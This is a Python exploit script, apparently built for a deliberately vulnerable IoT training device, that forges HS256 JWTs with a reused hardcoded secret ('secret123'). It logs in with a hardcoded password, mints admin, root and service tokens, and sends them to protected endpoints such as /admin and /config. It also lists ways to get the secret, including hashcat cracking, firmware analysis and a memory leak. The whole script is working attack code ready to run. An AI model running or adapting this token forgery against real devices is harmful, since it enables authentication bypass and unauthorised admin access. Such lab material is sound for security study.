#!/usr/bin/env python3
"""
Cryptographic Key Reuse Exploit.

Demonstrates that the JWT signing secret "secret123" is reused across
multiple services on the device. A single key compromise (e.g., from
JWT cracking, firmware strings, or memory leak) cascades to:

  - JWT token forgery (admin access)
  - Session token forgery
  - API authentication bypass

This tool forges admin JWTs and accesses protected endpoints to prove
the key reuse impact.

Requires: requests (pip install requests)
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time

try:
    import requests
except ImportError:
    print("ERROR: requests is required. Install with: pip install requests",
          file=sys.stderr)
    sys.exit(1)


def b64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def b64url_decode(data):
    """Base64url decode with padding restoration."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.urlsafe_b64decode(data)


def forge_jwt(payload, secret):
    """Create a signed JWT (HS256) with the given payload and secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))

    signing_input = header_b64 + b"." + payload_b64
    signature = hmac.new(
        secret.encode("utf-8"),
        signing_input,
        hashlib.sha256
    ).digest()
    signature_b64 = b64url_encode(signature)

    return (signing_input + b"." + signature_b64).decode("utf-8")


def decode_jwt(token):
    """Decode a JWT token without verification (for display)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def verify_jwt(token, secret):
    """Verify a JWT signature locally."""
    parts = token.split(".")
    if len(parts) != 3:
        return False

    signing_input = (parts[0] + "." + parts[1]).encode("utf-8")
    expected_sig = hmac.new(
        secret.encode("utf-8"),
        signing_input,
        hashlib.sha256
    ).digest()
    actual_sig = b64url_decode(parts[2])

    return hmac.compare_digest(expected_sig, actual_sig)


def test_endpoint(base_url, path, token, method="GET"):
    """Test accessing a protected endpoint with a forged token."""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        if method == "GET":
            r = requests.get(f"{base_url}{path}", headers=headers, timeout=5)
        else:
            r = requests.post(f"{base_url}{path}", headers=headers, timeout=5)
        return r.status_code, r.text[:500]
    except requests.RequestException as e:
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(
        description="Key reuse exploit - forge JWTs with the shared secret "
                    "and access protected endpoints on multiple services.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Forge admin JWT with default secret and test access

  %(prog)s --secret mysecret123
      Use a different shared secret (e.g., extracted from firmware)

  %(prog)s --target http://192.168.4.1
      Test against a specific device

  %(prog)s --secret secret123 --target http://192.168.4.1
      Full attack: forge tokens and verify access on the device

Attack chain:
  1. Obtain the JWT secret from any one source:
     - Crack a captured JWT (L10)
     - Extract from firmware binary (L03)
     - USB memory leak (L20)
     - Cache/timing side-channel

  2. The SAME secret "secret123" is used for:
     - JWT signing (login/admin access)
     - API token generation
     - Session management

  3. Forge admin tokens and access all protected endpoints.
""")
    parser.add_argument("--target", "-t", default="http://192.168.4.1",
                        help="Device base URL (default: http://192.168.4.1)")
    parser.add_argument("--secret", "-s", default="secret123",
                        help="Shared secret key (default: secret123)")

    args = parser.parse_args()

    print(f"[*] Target: {args.target}")
    print(f"[*] Shared secret: {args.secret}")
    print()

    # Step 1: Obtain a legitimate JWT from the device for comparison
    print("[*] Step 1: Requesting a legitimate JWT from the device...")
    try:
        r = requests.post(f"{args.target}/login",
                          data={"username": "user", "password": "CoreS3_User_2024"},
                          timeout=5)
        if r.status_code == 200:
            try:
                legit_data = r.json()
                legit_token = legit_data.get("token", "")
                print(f"    Legitimate token obtained.")
                header, payload = decode_jwt(legit_token)
                if payload:
                    print(f"    Claims: {json.dumps(payload)}")

                # Verify the legitimate token uses the same secret
                if verify_jwt(legit_token, args.secret):
                    print(f"    Signature verified with secret '{args.secret}'.")
                    print(f"    [+] KEY REUSE CONFIRMED: login JWT uses the shared secret.")
                else:
                    print(f"    [-] Signature does NOT verify with '{args.secret}'.")
                    print(f"    The device may use a different secret.")
            except (json.JSONDecodeError, KeyError):
                print(f"    Response: {r.text[:200]}")
        else:
            print(f"    Login returned status {r.status_code}: {r.text[:200]}")
    except requests.RequestException as e:
        print(f"    Could not reach device: {e}")
        print(f"    Continuing with offline token forgery...")

    print()

    # Step 2: Forge an admin JWT
    print("[*] Step 2: Forging admin JWT with shared secret...")
    iat = int(time.time())
    admin_payload = {
        "user": "attacker",
        "role": "admin",
        "iat": iat
    }
    admin_token = forge_jwt(admin_payload, args.secret)
    print(f"    Forged token: {admin_token[:80]}...")
    header, payload = decode_jwt(admin_token)
    print(f"    Claims: {json.dumps(payload)}")
    print()

    # Step 3: Forge tokens with different roles
    print("[*] Step 3: Forging tokens for multiple service contexts...")
    contexts = [
        {"user": "admin", "role": "admin", "iat": iat},
        {"service": "config-manager", "permissions": ["read", "write", "admin"]},
        {"user": "root", "role": "superadmin", "iat": iat, "exp": iat + 86400},
    ]
    forged_tokens = {}
    for ctx in contexts:
        token = forge_jwt(ctx, args.secret)
        name = ctx.get("user", ctx.get("service", "unknown"))
        forged_tokens[name] = token
        print(f"    {name}: {token[:60]}...")
        # Verify locally
        if verify_jwt(token, args.secret):
            print(f"      Signature valid (same key works for all)")
    print()

    # Step 4: Test forged tokens against protected endpoints
    print("[*] Step 4: Testing forged admin token against protected endpoints...")
    endpoints = [
        ("GET", "/admin"),
        ("GET", "/admin/status"),
        ("GET", "/config"),
        ("GET", "/stream?noauth=1"),
    ]

    for method, path in endpoints:
        status, body = test_endpoint(args.target, path, admin_token, method)
        if status is not None:
            truncated = body[:100].replace("\n", " ")
            if status == 200:
                print(f"    {method} {path}: {status} OK - access granted")
                print(f"      Response: {truncated}...")
            else:
                print(f"    {method} {path}: {status}")
                print(f"      Response: {truncated}")
        else:
            print(f"    {method} {path}: connection failed ({body})")

    print()

    # Step 5: Demonstrate the cascade
    print("[*] Step 5: Key reuse cascade summary")
    print()
    print(f"    Secret: '{args.secret}'")
    print()
    print("    The same key is used for:")
    print("    [1] JWT signing   - forged admin access to /admin, /admin/status")
    print("    [2] JWT signing   - forged service-level tokens")
    print("    [3] API auth      - any endpoint accepting Bearer tokens")
    print()
    print("    Attack paths to obtain the secret:")
    print("    - JWT cracking (hashcat -m 16500 with wordlist)")
    print("    - Firmware binary analysis (strings/Ghidra)")
    print("    - USB memory leak (usb-memleak command)")
    print("    - Diagnostic endpoint (/diag?id=26)")
    print()
    print("[+] Key reuse exploit complete. One secret compromises all services.")


if __name__ == "__main__":
    main()
